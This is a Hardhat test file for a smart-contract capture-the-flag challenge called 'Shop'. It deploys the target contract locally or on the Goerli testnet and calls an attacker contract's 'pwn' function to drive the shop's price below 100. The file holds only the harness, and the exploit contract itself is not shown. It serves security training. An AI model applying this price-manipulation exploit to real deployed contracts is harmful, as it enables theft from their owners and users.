const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Shop', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Shop');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Shop', deployer);
            this.target = await ContractFactory.deploy();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const AngleBuyerFactory = await ethers.getContractFactory('AngleBuyer', attacker);
        const AngleBuyer = await AngleBuyerFactory.deploy();
        console.log(`\t price before: ${await this.target.price()}`);
        console.log(`\t buying...`);
        let buyTX = await AngleBuyer.connect(attacker).pwn(this.target.address); await buyTX.wait();
        console.log(`\t price after : ${await this.target.price()}`);
    }).timeout(0);
    
    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(parseInt(await this.target.price())).to.be.lt(100);
    });
});